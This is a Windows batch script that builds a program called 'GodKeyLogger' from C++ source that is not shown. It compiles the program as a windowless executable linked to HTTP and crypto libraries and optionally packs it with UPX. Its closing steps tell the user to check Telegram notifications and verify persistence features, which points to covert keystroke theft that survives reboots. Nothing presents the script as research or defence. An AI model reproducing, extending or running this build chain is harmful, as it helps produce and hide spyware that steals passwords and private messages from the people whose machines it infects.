@echo off
echo ========================================
echo    GOD KEYLOGGER - FINAL BUILD v2.0
echo ========================================
echo.

:: Configuration
set COMPILER=cl.exe
set SOURCE=GodKeyLogger.cpp
set OUTPUT=GodKeyLogger.exe
set LIBS=user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib
set FLAGS=/EHsc /Ox /W2 /DUNICODE /D_UNICODE /MT /std:c++17

:: Check for Visual Studio
where cl >nul 2>nul
if %errorlevel% neq 0 (
    echo [ERROR] Visual Studio Compiler not found!
    echo.
    echo Please install:
    echo 1. Visual Studio 2022 Build Tools OR
    echo 2. Visual Studio Community Edition
    echo.
    echo Download from: https://visualstudio.microsoft.com/
    pause
    exit /b 1
)

:: Build command
echo [1/3] Compiling GodKeyLogger.cpp...
%COMPILER% %FLAGS% %SOURCE% /link /SUBSYSTEM:WINDOWS /OUT:%OUTPUT% %LIBS%

if %errorlevel% neq 0 (
    echo [ERROR] Compilation failed!
    pause
    exit /b 1
)

:: Verify
echo [2/3] Verifying executable...
if exist %OUTPUT% (
    for %%F in (%OUTPUT%) do (
        set size=%%~zF
    )
    echo [SUCCESS] Build completed!
    echo [INFO] File: %OUTPUT%
    echo [INFO] Size: %size% bytes
    echo [INFO] Time: %time%
) else (
    echo [ERROR] Output file not created!
    pause
    exit /b 1
)

:: Optional: UPX compression
echo [3/3] Optional: Compressing with UPX...
where upx >nul 2>nul
if %errorlevel% equ 0 (
    upx --best --ultra-brute %OUTPUT% >nul 2>&1
    echo [INFO] UPX compression applied
) else (
    echo [INFO] UPX not found (optional step)
)

echo.
echo ========================================
echo    BUILD PROCESS COMPLETED SUCCESSFULLY
echo ========================================
echo.
echo Next steps:
echo 1. Test on Windows system
echo 2. Check Telegram notifications
echo 3. Verify persistence features
echo.
pause
